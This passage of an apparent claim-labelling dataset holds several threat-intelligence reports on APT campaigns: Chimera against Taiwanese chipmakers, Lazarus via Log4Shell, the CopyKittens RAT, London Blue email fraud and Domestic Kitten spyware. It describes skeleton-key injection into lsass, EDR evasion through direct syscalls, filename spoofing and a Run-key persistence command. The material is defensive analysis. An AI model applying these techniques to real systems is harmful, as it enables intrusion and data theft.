Needless to say, the repercussions from a cyber attack on Taiwan’s semiconductor sector could be catastrophic. Due to the high market value of the semiconductor industry, vendors have invested heavily in their cyber capabilities, especially in protecting the industrial control system (ICS) equipment used in fabrication plants. Although operational technology (OT) and information technology (IT) security is equally important, more emphasis has been placed on the former. This is evidenced by the fact that many vendors have opted to isolate their ICS equipment to ensure the manufacturing process is never interrupted. The downside to this approach is that once malicious code finds its way into the isolated environment, it can spread to other machines very quickly. One foremost example is the 2018 WannaCry ransomware attack on TSMC [3]. The hit on the world’s largest foundry company forced some of the plants to go offline for an entire day. Additionally, it took several days before the malware could be fully eradicated. The total damage caused by this attack reached $256 million. Separately, ASUS, which is a leading PC manufacturer in Taiwan, saw millions of its users impacted by Operation ShadowHammer [4]. In this report, we will show how IT attacks on semiconductor vendors can be just as damaging as an OT attack. Between 2018 and 2019, we discovered several attacks on various semiconductor vendors located at the Hsinchu Science-based Industrial Park in Taiwan. As these attacks employed similar attack techniques and tactics, a pattern could be discerned from the malicious activities. From this pattern, we deduced that these attacks, which we dubbed Chimera APT Group, were actually conducted by the same threat actor. The main objective of these attacks appeared to be stealing intelligence, specifically documents about IC chips, software development kits (SDKs), IC designs, source code, etc. If such documents are successfully stolen, the impact can be devastating. The motive behind these attacks likely stems from competitors or even countries seeking to gain a competitive advantage over rivals. Since these techniques and tactics were similar to previous attack activities, we suspect the attacker is a China-based hacker group. We thus hope that this report will help semiconductor companies gain a better understanding of the dangers from such attacks. Additionally, as we have worked with several of the semiconductor vendors to improve their cyber security, we wish to share this valuable experience, and highlight the current challenges facing the entire industry. In this report, we conduct a comprehensive analysis on the employed technologies, tactics, and customized malware of Chimera APT Group. As this operation has not yet been documented, the techniques and tactics disclosed in this report can help blue teams design better defenses, and develop better detection and hunting methods. Below summarizes our findings of Chimera. During our investigation of Chimera APT Group between 2018 to 2019, more than 30,000 endpoints belonging to various semiconductor vendors were analyzed. Two representative cases were chosen for a deeper analysis. The two cases (hereafter Case A and Case B) involved in the analysis currently have a leading global position in their own market segments. With business sites scattered around the world and a large annual revenue, their main research and development hub are both located in Taiwan. Two different approaches were adopted when investigating the two companies. For Case A, as we already enjoyed a long-term cooperation, our assistance focused on monitoring their systems. This allowed us to quickly identify the cyber attack in a short period of time. By contrast, as victims in Case B discovered on their own various abnormal activities, they asked for our help to formulate an effective incident response. During our forensic investigation, we found that the attacks had already been occurring for more than a year. As the activities, attack techniques and tactics were similar in the other cases we investigated, we believe this was the work of the same threat actor. In this case, the victim company had already subscribed to our continuous threat hunting service. Our investigation revealed malicious activities occurring between 2019-12-09 ~ 2019-12-10. Meanwhile, in this incident, 15 endpoints and 6 user accounts were compromised, and 4 malwares and 8 C2 servers were found. To help better depict the operational details of this case, the cyber situation graph and storyline is respectively shown in Fig 1. Note that all the server/user names are de-identified, and replaced with names that can represent their roles. The same APT malware - GoogleUpdate.exe - was found on two endpoints. On the day we discovered this malware, no information could be found on VirusTotal (VT). To confuse security products and analysts, the malware replaced the original GoogleUpdate binary and functioned as a mutated Cobalt Strike beacon to inject payloads into other processes. Moreover, network security devices had difficulty detecting the associated C2 servers, as they were located in the Google Cloud Platform. The C2 server domains are listed in Appendix I of the IoC section. After successfully connecting back to the C2, the attacker used RECORDEDTV.MS to archive the stolen data for data exfiltration. It is worthy to note that even without the .exe file extension, the data exfiltration process could still be executed. Identical binaries were found in several machines, but under different names, e.g. RECORDEDTV.MS, uncheck.dmp, and jucheck.exe. This aroused our suspicions and prompted us to suspect the binary was masquerading as a Java Update program. Inserting malware in a location where legal software is stored seems to be a characteristic tactic of Chimera. For this case, it was found that the disguised program, which was a modified RAR software, had a one-byte discrepancy from the original version. We are still ascertaining the reasons behind this difference. To track the root cause, we found that the first Cobalt Strike backdoor was located at NB-CLAIR, and was then remotely copied to Server-LAUREN. A valid account was used to invoke Cobalt Strike via schtasks (Fig 2). Server-LAUREN also archived the registry and ntds.dit to other hosts for offline breaking. The latter is an AD database, which contains information about domain hosts and users, e.g. id, name and password hash. Since this file was encrypted, and the key was stored in the SYSTEM registry, the threat actor needed to archive both ntds.dit and the registry to both decrypt the file and remotely brute-force the password hash. The control of Server-LAUREN , which was also achieved via schtasks, was traced back to the NB-CLAIR machine. From the NB-CLAIR timeline, we noticed that a remote desktop program (RDP) from a certain IP was run just six minutes before the schtasks was executed (Fig 5). Since this IP was a VPN server, and a valid account was used to log in to it, we believe the actor acquired the password from a separate data breach.Suspicious activities were discovered in the victim company of Case B during an upgrade to their network infrastructure. We were tasked by the company to investigate this incident, which began in November 2019. During our investigation, we found that the cyber attack pattern resembled the tactics employed by Chimera. The entire attack occurred between October 7, 2018 to November 18, 2019, and a total of 24 endpoints were compromised. In these endpoints, 8 compromised accounts, 3 malware and 5 C2 servers were discovered. The persistence of this attack can be seen by the fact that it lasted for more than a year. The cyber situation graph and storyline are respectively shown in Fig 6 and Fig 7. Unlike Case A, powershell scripts were widely used, which can be seen in following code snippets. To avoid the file-based detection mechanism, the payload was injected directly into the system memory. The injected malware was discovered in roughly 10 endpoints, which included two domain controllers. The powershell script was a Cobalt Strike backdoor and was used for process migration to other system processes. We found several hosts that had the Cobalt Strike malware implanted in their infected svchost.exe. Despite the discovery of the early stage malware and activities, the launch of our investigation was already at a very late point in time. Thus, there was insufficient evidence to pinpoint the likely initial access point. We surmise that the attack occurred via stolen valid credentials or phishing emails. As mentioned earlier, legal cloud services were widely used by Chimera as their C2 to avoid threat attribution. In this case, Appspot[.]com and azureedge[.]net were applied as the C2. The actor also used a RAR program under the guise of innocuous file names such as RecordedTV.ms, jucheck.exe and vmware.log to archive and steal the data of interest. A similar scheme was utilized by the attacker to archive the passwords they used. The following shows a sample command of the archived information.Based on the file names of the stolen files, it seemed to include chip documents, SDKs and even the source code. The key motive of the actor was to acquire semiconductor proprietary data. Similar to Case A, a DLL file (d3dll.dll) was used to deploy a Skeleton Key malware. An in-memory patch was performed to allow easy system log-in. Some of the de-identified leaked file names are listed below.It is worthy to note that among the various semiconductor vendors we investigated, similarities were seen in the deployed malware, techniques, and tactics. This particular APT group seemed to have a keen interest in targeting the semiconductor industry. Additionally, in the absence of an AD monitoring system, we saw some vendors employing a white-list enforcement approach. Although this is a feasible approach, as the AD cannot execute any software outside the white-list, our investigation shows that APT actors were still able to use Living off the Land Binaries (LOL) bins to launch an attack.Our analysis also revealed several suspicious memory modules. The first memory module resembled a CobaltStrike or metasploit beacon. The memory module was a PE file with a broken header, as seen in Fig 8 and Fig 9. From the figure, we can also see that the PE metadata has some invalid values, which contains a hidden shellcode (from offset 2).The disassembled shellcode, which is a Reflective Loader, is listed in Fig 10. It first located the next payload at offset 0x1791C, and then loaded the payload. Meanwhile, 56A2B5F0 is the API hash of ExitProcess, which denotes the process exit.The other memory modules contained a different CobaltStrike beacon, and were used for migration. The first stage beacon injected a payload to a process for process migration. From the memory content (Fig 11), the “.\\pipe\\mojo.5688.805…” string was the pipe created by the CobaltStrike beacon.As we performed a deeper reverse engineering, we found that the process migration made use of the pipe inter-process (IPC) mechanism for communication. The injected code first used CreateNamePipe and ConnectNamePipe to establish an IPC with the original beacon (Fig 12). After reading the entire shellcode via the ReadFile from the name pipe, the shellcode was invoked in 0x401155, and a CobaltStrike backdoor was created (Fig 13). Upon discovery of this sample, we first performed a retrohunt analysis. The discovery of a related binary led us to initially believe the sample was a Dumpert. However, a more in-depth analysis revealed that the d3d11.dll sample implanted a skeleton key, where adversaries could persistently control (before the system reboot) the infected machine and machines under the infected AD. More specifically, the malware was an account manipulation tool that contained code extracted from both Dumpert and Mimikatz. We called this malware SkeletonKeyInjector. The malware employed a technique that altered the NTLM authentication program and implanted a skeleton key to allow adversaries to log-in without a valid credential. This allowed the adversary to achieve the following objectives:To show which functions shared a resemblance to Mimikats or Dumpert, we reversed the functions of d3d11.dll and recovered the function names in Fig 14. For easy understanding, we recovered the function names that migrated from Mimikatz, which have either the “kuhl” or “kull” prefix. As for functions that migrated from Dumpert, the prefix “Dumpert” was included in the name. For functions that were implemented by the adversary, no prefix was added.In order to bypass the API monitoring, which is widely used in anti-virus or EDR products, the malware directly invoked syscalls and implemented high level API logic. Since the syscall numbers differ between each Windows version, the following code snippet was used to determine the OS version in use, and thereby obtain the correct syscall number. Our analysis showed that this code snippet was copied from Dumpert.To run the Mimikatz code snippet used by the malware, a privilege called SE_DEBUG_PRIVILEGE was needed. The code shown in Fig 16 used RtlAdjustPrivilege to obtain the SE_DEBUG_PRIVILEGE to allow the malware to open, read, and write other process memory as a debugger. By comparing the code snippet (Fig 17) with the original code in Mimikatz (Fig 18), we found that instead of calling the OpenProcess API, the malware instead invoked OpenProcess via Dumpert. As mentioned earlier, the malware sought to bypass the API hooking via syscalls. SkeletonKeyInjector first searched for the string “Kerberos-Newer-Keys” in the lsass.exe process memory. When the “Kerberos-Newer-Keys” address was found, it then searched for the Unicode structure in the memory that referenced this address. Afterwards, the Unicode structure was altered with empty strings by manipulating the string reference to an empty string and size zero. This manipulation downgraded the lsass.exe in using insecure crypto scheme - RC4 without salt. From Fig 17 and Fig 18, the similar code segments between Mimikatz and d3d11.dll are shown. After downgrading to RC4, the SkeletonKeyInjector altered the function pointers in cryptdll.dll!CDLocateCSystem by redirecting them to its customized functions (Fig 19). Specifically, two functions were altered, one for the RC4 initialization, and the other for the RC4 decryption. In the RC4 initialization function, a new RC4 NTLM was injected with a pre-calculated hash value of the skeleton key. When the authentication check failed due to incorrect credentials, the RC4 decryption function prompted the authentication process to compare the credentials with the skeleton key. Once a match was confirmed, the log in was permitted. Noteworthy, the malware contained customized NTLM hash, which had a slight difference over the original Mimikatz. This program is not considered malware, but a modified legitimate RAR program that was utilized in this operation. The original version is shown below：Specifically, this is a rar.exe v3.6. In Figure 22, the left section shows the original rar.exe, while the right section depicts the RecordedTV.ms. Our research shows one of the bytes in the code segment was altered, as depicted in Figure 23. However, we are still determining the reason why a byte size data was altered. All of the cases that we investigated used this modified rar.exe program to archive the stolen data, which is evidence that these attacks were likely conducted by the same group. The last malware involved in this operation was BaseClient.exe, which is a general network testing tool. We suspect this program was not developed by the adversary, but was obtained from a benign source. Used by the adversary for network reconnaissance, it is unlikely to be flagged by security systems, as the program may be inherently benign.In this chapter, we summarize the techniques employed in Chimera APT. These techniques are organized based on the MITRE ATT&CK framework.For nearly two years, our team monitored several attacks that targeted Taiwan’s semiconductor vendors. We believe these attacks originated from the same threat actor - Chimera, as these attacks utilized similar tactics, techniques and even the same customized malware. The actor likely harvested various valid credentials via phishing emails or data breaches as their starting point to conduct their cyber attack on the vendors. CobaltStrike was later used as their main RAT tool. To avoid detection, the CobaltStrike RAT was often masqueraded as a Google Chrome Update. The RAT would then connect back to their C2 server. As these servers were in a public cloud server, it made it difficult to track. Subsequently, by compromising the AD server, the delicate malware - SkeletonKeyInjector - was invoked to implant a general key to allow LM, persistence and defense evasion. Although this malware was discovered for the first time, we have high confidence that these attacks were conducted by the same threat actor. Based on the stolen data, we infer that the actor’s goal was to harvest company trade secrets. The motive may be related to business competition or a country’s industrial strategy. We hope that the tactics, techniques and IoCs disclosed by this report can better help semiconductor vendors improve their security mechanisms and prevent such attacks from occurring again.\n\n\n",

        "explain": "Despite receiving a patch two years ago, the Log4Shell vulnerability remains a popular attack vector even for sophisticated threat actors. An example is a recently documented attack campaign against companies from several industries by the North Korean state-run Lazarus APT group. The Lazarus attackers exploited Log4Shell (CVE-2021-44228) in publicly facing and unpatched VMware Horizon servers and used their access to deploy custom remote access trojans (RATs) written in DLang, a programming language that’s not commonly used in malware development. The campaign, dubbed Operation Blacksmith by researchers from Cisco Talos, appears to have started in March and continues to date. The attacks are more likely opportunistic in nature rather than targeted with recorded victims in the manufacturing, agricultural, and physical security sectors.Custom remote access trojans built with uncommon technologies The Lazarus group (APT38) is one of North Korean government’s hacking teams and is usually tasked with cyberespionage and sabotage objectives. The group’s malicious activities span back many years and it shares some of its toolset and infrastructure with other North Korean APT groups. In fact, the Talos researchers believe the Lazarus APT today is most likely an umbrella for different sub-groups that operate their own campaigns that develop bespoke malware for their targets. These sub-groups might have different objectives and don’t always coordinate with each other, despite the occasional overlap. “During our analysis, Talos found some overlap with the malicious attacks disclosed by Microsoft in October 2023 attributing the activity to Onyx Sleet, also known as PLUTONIUM or Andariel,” the Talos researchers said in their new report on Operation Blacksmith. The Andariel campaign documented by Microsoft exploited CVE-2023-42793, a critical vulnerability in JetBrains TeamCity server, a CI/CD tool used in DevOps. The overlap with Lazarus’ Blacksmith operation was the use of a custom proxy tool dubbed HazyLoad that has only been observed in these two campaigns. However, the other malware implants were different. In Blacksmith, the attackers deployed three different malware programs written in DLang, a programming language originally released in 2001 that uses C++ as inspiration but adds many features and paradigms borrowed from other languages. DLang is an unusual choice for malware development, but Lazarus is known for adopting non-traditional technologies with previous examples including QtFramework and PowerBasic. One of the DLang-based implants deployed in the post-exploitation stage is dubbed NineRAT and is a RAT that uses Telegram as a command-and-control (C2) channel. “With NineRAT activated, the malware becomes the primary method of interaction with the infected host,” the Talos researchers said. “However, previously deployed backdoor mechanisms, such as the reverse proxy tool HazyLoad, remain in place. The multiple tools give overlapping backdoor entries to the Lazarus Group with redundancies in the event a tool is discovered, enabling highly persistent access.” By using the NineRAT samples as a reference, the Talos researchers managed to locate two additional implants that used similar code. One is a downloader also written in DLang that the researchers dubbed BottomLoader. Its purpose is to download an additional payload from a hardcoded URL by using a PowerShell command. The second implant is more sophisticated and is both a payload downloader and remote access trojan that was dubbed DLRAT. Unlike NineRAT, DLRAT doesn’t use Telegram for C2 but sends information about the infected host over HTTP to a C2 web server. In return the attackers can instruct it to upload local files to the server, to rename files and to download additional payloads. “The threat actors also created an additional user account on the system, granting it administrative privileges,” the researchers said. “Talos documented this TTP earlier this year, but the activity observed previously was meant to create unauthorized user accounts at the domain level. In this campaign, the operators created a local account, which matches the user account documented by Microsoft: krtbgt.” Log4j is the gift that keeps on giving Log4Shell was originally reported on December 9, 2021, and is in a highly popular Java library called Log4j. Because of the library’s widespread use, the vulnerability impacted millions of Java applications — both applications that companies developed in-house, as well as commercial products from many software developers. Patches became available for Log4j days after the flaw was announced, but it took months for all impacted vendors to release patches and for organizations to update their internal apps. Despite the big publicity that the flaw received, two years later a large enough number of systems appear to remain vulnerable for groups like Lazarus to still use the exploit. According to software supply chain management company Sonatype that also operates the Central Repository for Java components, over 20% of Log4j downloads continue to be for vulnerable versions. Application security firm Veracode reports that based on its own telemetry only 2.8% of tested applications are still using versions of Log4j with the Log4Shell vulnerabilities. However, an additional 3.8% use a version of Log4j 2.x vulnerable to another high-severity issue tracked as CVE-2021-44832 and a third of all applications that include Log4j continue to use the older 1.x series of the library that has reached end of life and has not received security patches for a long time. While Log4j 1.x is not affected by Log4Shell, it currently has seven other high and critical vulnerabilities that remain unfixed. “Our research also found that once developers are alerted to a vulnerable library through a scan, they fix them relatively quickly: 50% of vulnerabilities are fixed in 89 days overall, in 65 days for high severity vulnerabilities and in 107 days for medium severity vulnerabilities,” Veracode’s chief research officer Chris Eng said in a blog post. “This contradicts the Log4j data above, which shows that remediation is not happening quickly for this open-source library, especially for Log4j 1.2.x.”\n\n\n",

        "explain": "The Middle East has been a cyber warfare hotspot for almost a decade now, a theatre for some of the most advanced threats the world has ever witnessed. In between those highly advanced attacks, more and more attackers possessing only a basic set of skills started to pop up – spreading well known RATs, obfuscated with generic publicly-available packers. This report focuses on the CopyKittens, a mid-level group. The CopyKittens attacks are effective and advanced in a few ways:Yet, this group is clearly not made up of dozens of high-end computer and security experts. The CopyKittens assembled major parts of their attack from code snippets carefully picked from public repositories and online forums, hence their nickname. We also named their attack tool “Matryoshka”1 due to the fact that it was written as a multi-stage framework, with each part of it built to integrate its subsequent step. We have had only a partial window to the targets of these semi-sophisticated yet highly effective attacks. Among them were high ranking diplomats at Israel’s Ministry of Foreign Affairs and some well-known Israeli academic researchers specializing in Middle East Studies. Even if we combine this with the fact that attackers goal seemed to be theft of sensitive data, we still lack the ability to clearly identify who is behind this attacks and if it was sponsored by another major actor. In our opinion, this will not be the last time we hear from this group. Their constant striving toward improved performance, the fact that they probably executed successful attacks and the current turmoil in the Middle East region leads us to the conclusion that the CopyKittens will keep striking targets with similar profiles in the near future.CopyKittens has conducted at least three waves of cyber-attacks in the past year. In each of the attacks the infection method was almost identical and included an extraordinary number ofstages used to avoid detection. As with other common threat actors, the group relies on social engineering methods to deceive its targets prior to infection.The attack is initiated by sending an infected document file as an email attachment. In most cases the email subjects have been carefully chosen to match the target’s interests. We were able to retain a copy of an email used to target an Israeli ambassador in a large eastern European country. Some of the emails subjects were: The embedded binary objects in the lure documents contained a trailing “fdp.scr” in their names with a special invisible Unicode character. This character officially described as “Right-To-Left Override” flips the directionality of the string from its position and onward. For example, if we name a file “filename [special flipping char]fdp.scr” it will be displayed as “filename rcs.pdf”. This form of subterfuge has been previously employed by other Middle Eastern threat actors such as “Desert Falcons”, reported by Kaspersky3 and by elements operating in Syria4 . In other cases, the document includes instructions motivating the victim to enable macro code execution. If the trap is successful and the user played his part, the infection stage begins.Unlike most malwares, CopyKittens’ tools are bound to each other. The Matryoshka infection framework is built of three parts:Files with scr extension are just the same as exe executables. Windows screen savers originally used this extension but nowadays medium-level threat actors commonly use it as a way to deceive the average user who might be deterred from an exe file extension. The dropper name always matched the promised content of the spear phishing email. In the latest version of the dropper, the lure pdf is saved to the user’s %TEMP% folder with an “~st” prefix and random number, followed by a “.pdf” extension. Once the file has been successfully saved, the pdf is opened and displayed to the user via ShellExecute API and Open command. This is done to lower the target's suspicions and mask the true functionality of the executable. While the user unsuspectingly reads the document, the following routine runs hidden in the background: The malware first unpacks the “Reflective Loader” component into the memory and signals to its “C2 parents” the attack has been executed by downloading an image file from a remote server. The URL of the remote file is built out of two constant strings which again might suggest some kind of builder to this platform. After signaling to the attackers, the malware calls a specific export function from the Reflective Loader named “_check”. This routine is a copied code from the “Pafish” open source project, led by Alberto Ortega (@a0rtega) 5 who describes it as: “A demonstration tool that employs several techniques to detect sandboxes and analysis environments in the same way as malware families do”. Pafish will enumerate and look for known virtualization and sandbox artifacts and then print results back to the researcher screen.Since the original Pafish code is built to improve security researchers’ ability to discover evasive malware, the CopyKittens group has modified the code logic. Instead of printing the functions’ results back to the user, the code will now assign a static number from 1-27 in the case of an artifact being found, and will return that value to the calling function (the SCR dropper in this case). Upon returning from the “_check” function, the dropper will perform a simple comparison and if an analysis machine has been detected, it will signal the attackers again using almost the same URL as it did before but replacing the name of the “.png” file to the letter “n” concatenated with the number of the artifact found by Pafish. Below is a table demonstrating the artifacts and their corresponding value:During our investigation we were able to identify an example of this behavior in a VirusTotal report on one of the domains used by the attackers: We believe this URL was submitted by a target or other researchers analyzing the malware. After alerting the attackers they have been discovered, the dropper will try to delete the temporary files created by him and terminate activity of the infection process. In the case no analysis machine is found, Reflective Loader will be called again with the “_dec” (possibly abbreviation of the word “decrypt”) and the third stage of the attack will commence. In an attempt to increase stealthiness, the CopyKittens group has decided to use another open source project6 by Stephen Fewer (@stephenfewer). The project implements a remote library injection technique called “Reflective DLL Injection”. Fewer describes the method in his paper7 : “Reflective DLL injection is a library injection technique in which the concept of reflective programming is employed to perform the loading of a library from memory into a host process”. This method enables the RAT library to run on the host machine without a dedicated process and without registration of the library under the loaded modules. The original project was built as a command line utility with the target process identifier provided as an argument. In a real attack scenario, the injected process identifier is obviously unknown to the attacker and a suitable host process should be located at runtime. The CopyKittens group has implemented this routine by using WTSEnumerateProcess API to get a list of current active processes and then trying to get a handle to each process via OpenProces API, avoiding x64 processes.The main part of “Matryoshka” is a remote administration tool library. It is designed to exist in the infected computer memory and is never written to the computer's physical disk itself. When we “dumped” the RAT to the disk, some of the AV tools detect it with the following signatures：Since the library is injected into memory, the imported functions must be resolved in runtime, to solve this problem the CopyKittens group used a method called “Runtime API Address Resolution”10 using the LoadLibrary and GetProcAddress APIs. In order to evade static virus scannersin new version of the RAT, the attackers obfuscated the names of the API functions. They resolve them in runtime using a simple substitute cipher combined with Base64 encoding. The same trick was used in the Reflective Loader component. We retrieved the original functions names as plaintext strings by using a simple Python script. A list of decrypted API strings and the python code can be found in the Appendix and Minerva Labs Research GitHub repository11 . Since the RAT library was built to run from the memory of a host process, it relies on the loader to survive system restart. The first time the RAT runs, it will copy the reflective loader, named “kernel.dll” to one of Windows’ common folders and will create a registry key named {0355F5D0- 467C-30E9-894C-C2FAEF522A13} under “SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” with the value of “C:\\Windows\\System32\\rundll32.exe “\\%LOCATION%\\kernel.dll” _dec” to rerun the injection routine after each boot. In addition, to make sure the RAT always runs (since host process might be closed or crash), the RAT creates a task in the Windows task scheduler named “Microsoft Boost Kernel Optimization” which will re-run the injection routine every 20 minutes. The task scheduler method has also been added to the newest version of the RAT.This makes the RAT unstable as multiple instances may be executed simultaneously on the same host machine causing unexpected behavior. To reduce this risk, the authors have used a global mutex.Once a command is received from the C2 server in the DNS response, the RAT will translate it to a corresponding command. For example, when the C2 sends a DNS response with the IP address 134.170.185.13, the RAT will try and steal outlook passwords.This functionality resembles a method described by SecurityExploded 12 for “Recovering Passwords from Outlook 2002-2013”. We can assume that the group has copied this code as well. In comparing samples from different attack cycles, we can easily see that the attackers have spent time improving their tool, making it more persistent and harder to detect. For example, between the first versions of the RAT and the latest, the group started to resolve more API during runtime, using obfuscated strings. A comparison of the outlook password extraction function from previous and current RAT versions can be seen below.\n\n\n",

        "claim": "London Blue Group Using Evolving BEC Techniques in Attacks.",
        "original_label": "true",
        "label": "true",
        "explain": "Phishing is nothing new, and efforts to train employees on how to detect and thwart phishing attacks should always be an essential component of any security awareness training program. But what happens when phishing attacks specifically target chief financial officers (CFOs)? Researchers have discovered increasing evidence of a threat group named London Blue, a U.K.-based collective that focuses on CFOs at mortgage companies, accounting firms and some of the world’s largest banks. According to a report passed on to authorities by Agari, London Blue has collected email addresses for more than 50,000 senior-level targets in the U.S. and other countries, of which 71 percent hold a CFO title. The Agari report noted that London Blue operators have been utilizing email display name deception to trick senior employees into making fraudulent payments to the threat group’s accounts.This type of attack, classified as business email compromise (BEC), builds on the typical phishing attack by taking the social engineering aspect to the next level — and sometimes includes elaborate hacking into email servers and the takeover of executive email accounts. But perhaps the most concerning feature of London Blue is that it is an organized cybercrime gang (OCCG) and, as such, works as efficiently as any modern corporation, with specific departments for lead generation, financial operations and human resources. Crane Hassold, Agari’s senior director of threat research, explained that the report came about when London Blue targeted the company’s CFO for a potential BEC attack. “Once that came in we started doing a little more digging, and there was a lot of active engagement with the scammers to understand more about them,” he said. It took Agari about four months of engagement after first observing the threat group to release the report. BEC is a hot topic because it has been relatively successful. What’s really interesting to Hassold and his team is that the attack doesn’t require any technical means to get a result. “When we think of cyberattacks, we think of things like malware-based attacks where there’s something technical that happened, but in this case, it’s pure social engineering,” said Hassold. Given his background with the Federal Bureau of Investigation (FBI)’s Behavioral Analysis Unit, Hassold is keenly aware that social engineering is the conduit to many cyberattacks.“A lot of work has to go into them in order to make them successful, but the reasons we’re seeing these being used more commonly is that they’re relatively easy to do with no technical knowledge needed to send one of these things out,” he said. Even if these attacks have a success rate of less than 1 percent, Hassold noted, threat actors can still net tens of thousands of dollars a month.On a positive note, despite being so organized, groups like London Blue are still using old-school tactics such as the “Nigerian prince” scam, in which poor grammar and spelling are prominent. Red flags should be easy to spot. Yet, somehow, these scams still work on a very limited scale. “They’re still around because they are successful enough,” said Hassold. “Even though most people would look at one of those things and ask ‘how could anyone actually fall for this?’, there’s always going to be a tiny population of people that will fall for it. They prey on central components of the human brain, like trust, fear and anxiety.” Those components are usually on overdrive when an employee gets an email he or she believes is coming from a CEO or CFO. Not only have London Blue’s tactics remained the same over the last few years, but its BEC attack isn’t all that complicated. According to Agari’s report, the threat group uses a throwaway email address and changes the display name to match the CEO or CFO of a company. Attackers then send an email to the target financial executive — from their collection of email addresses — asking them to initiate a money transfer for some made-up reason. If London Blue gets a response from the victim, it replies with one or two bank accounts that they control for the money transfer.There’s no reason to believe that the rise in senior-level phishing attacks is going to stop anytime soon. So what are the best tactics to prevent this type of attack? The easiest solution, of course, is to avoid clicking on links or attachments that appear suspicious. Even if an email seems to be legitimately coming from someone you know, it’s best to think twice before clicking or replying. “We’ve been accustomed to just simply reacting or responding to emails,” said Hassold. “That’s how we do business, but I think part of what we need to do is take a second to stop and think about what we’re looking at before we take any action.” Like anything related to security, doing your due diligence is a must, even for day-to-day emailing. While security awareness training for the C-suite is never a bad idea, in the case of a BEC attack, it may not be immediately helpful. Because these attacks have such a low overall success rate, you’d need a perfect 0 percent click rate in security awareness simulations to completely prevent them. Additionally, in Hassold’s experience, CEOs and CFOs are generally less receptive to security awareness training. “They are extremely busy doing a lot of other different types of activities, so sitting down and having them learn about what the threats are to the business is difficult,” he explained. CSOs and CISOs: Brush Up on Your Marketing Skills Instead of awareness training, your chief security officer (CSO) or chief information security officer (CISO)’s time may be better spent making sure other executives understand cyber risks in a way that resonates with them — for example, by showing financial executives real-world incidents that have cost companies millions of dollars. No executive wants his or her company to be the next Maersk; the container shipping conglomerate lost up to $300 million and had to reinstall 45,000 PCs and 4,000 servers after being hit by NotPetya ransomware in 2017, according to ZDNet. I recall having a long conversation about security awareness with the CSO of a large beverage company, who told me that when it comes to convincing other executives of the importance of security, you need to act like the marketing department and sell them on the concept. This CSO often has her team create pitch decks full of real-world examples to underscore the importance of proper security hygiene. This tactic can work wonders when executed effectively. Don’t Underestimate the Threat of Business Email Compromise For Hassold, the biggest takeaway from Agari’s report is how groups like London Blue acquire their information. “These groups are using legitimate services used by sales teams all over the world to curate their targets,” he said. Using popular sales prospecting tools, threat groups can narrow targets by granular demographics and export them into a nice CSV file. The report concluded that “the pure scale of the group’s target repository is evidence that BEC attacks are a threat to all businesses, regardless of size or location.” Agari also predicted that the use of legitimate services for malicious means will increase in the future. Business email compromise attacks are clearly a major threat for IT and security leaders to keep an eye on as attackers continue upping their game and making their emails look more legitimate. A strong security culture, combined with a back-to-the-basics approach to security training, can help enterprises avoid being on the receiving end of a successful attack.

        "original_label": "true",
        "label": "true",
        "explain": "Chinese strategist Sun Tzu, Italian political philosopher Machiavelli and English philosopher Thomas Hobbes all justified deceit in war as a legitimate form of warfare. Preceding them all, however, were some in the Middle East who had already internalized and implemented this strategy to great effect, and continue to do so today. Recent investigations by Check Point researchers reveal an extensive and targeted attack that has been taking place since 2016 and, until now, has remained under the radar due to the artful deception of its attackers towards their targets. Through the use of mobile applications, those behind the attack use fake decoy content to entice their victims to download such applications, which are in fact loaded with spyware, to then collect sensitive information about them. Interestingly, these targets include Kurdish and Turkish natives and ISIS supporters. Most interesting of all, though, is that all these targets are actually Iranians citizens.Considering the nature of the target, the data collected about these groups provides those behind the campaign with highly valuable information that will no doubt be leveraged in further future action against them. Indeed, the malware collects data including contact lists stored on the victim’s mobile device, phone call records, SMS messages, browser history and bookmarks, geo-location of the victim, photos, surrounding voice recordings and more. While the exact identity of the actor behind the attack remains unconfirmed, current observations of those targeted, the nature of the apps and the attack infrastructure involved leads us to believe this operation is of Iranian origin. In fact, according to our discussions with intelligence experts familiar with the political discourse in this part of the world, Iranian government entities, such as the Islamic Revolutionary Guard Corps (IRGC), Ministry of Intelligence, Ministry of Interior and others, frequently conduct extensive surveillance of these groups. Indeed, these surveillance programs are used against individuals and groups that could pose a threat to stability of the Iranian regime. These could include internal dissidents and opposition forces, as well as ISIS advocates and the Kurdish minority settled mainly in Western Iran. While our investigation is still in progress, the research below reveals the full extent of these targeted attacks, its infrastructure and victims and the possible political story behind it. In the meantime, we have dubbed this operation ‘Domestic Kitten’ in line with the naming of other Iranian APT attacks. Victims are first lured into downloading applications which is believed to be of interest to them. The applications our researchers discovered included an ISIS branded wallpaper changer, “updates” from the ANF Kurdistan news agency and a fake version of the messaging app, Vidogram. Regarding the ISIS-themed application, its main functionality is setting wallpapers of ISIS pictures, and therefore seems to be targeting the terror organization’s advocates. Curiously, its Arabic name is grammatically incorrect (“الاسلامیة خلافة دولة“, which should instead be .(“دولة الخلافة الاسلامیة” With regards to the ANF News Agency app, while ANF is a legitimate Kurdish news website its app has been fabricated by the attackers to pose as the legitimate app in order to deceive their targets. Due to the names and content that is offered by the above mentioned applications then, we are lead to believe that specific political groups and users, mainly ISIS supporters and the Kurdish ethnic group, are targeted by the operation. However, when most of the victims are actually Iranian citizens, it raises more pertinent questions about who may be behind the attack. Due to the attack infrastructure, reviewed below, and its consistency with previous investigations of state-sponsored Iranian operations covered by Check Point researchers, we were led to believe that Iranian government agencies may well be behind the campaign.A closer look at each of the applications used in the campaign show them to have the same certificate that was issued in 2016. This certificate is associated with the e-mail address ‘telecom2016@yahoo[.]com’, as seen below.Unfortunately not much is known about this e-mail address, as it was not used to register any domain names or to launch attacks in the past. Another unique characteristic of the applications used, though, is that all of the samples analyzed have several classes that are under a misspelled package name.All of the stolen data is then send back to C&C servers using HTTP POST requests. Additionally, one of the applications contacts firmwaresystemupdate[.]com, a newly registered website that was seen to resolve to an Iranian IP address at first, but then switched to a Russian address.Although these IP addresses were contacted directly, they are newly registered domains that resolve to each of the IP addresses and they all follow the same pattern of a first name-surname naming convention: Each victim then receives a unique device UUID (a UUID is the encoded value of device’s android_id), which appears at the beginning of each log that is sent back to the attacker, with the title of each log having the same structure: UUID_LogDate_LogTime.log. When a log is created for a victim, some basic information is then collected and documented prior to the logging of phone call details. In addition, all the logs use a unique delimiter “~~~” to separate between the fields of the stolen data：This information is collected and sent back to C&C servers when the command is received from the attacker. These commands also follow the same structure as the log, as it uses the same delimiter, and can include things such as “Get File”, “Set Server”, “Get Contacts” and more: As a result of all the above, this glance into inner working of this attack infrastructure therefore allowed us to form a precise idea about how wide this attack is and the victims targeted. Having analyzed the full extent of the operation, as well as 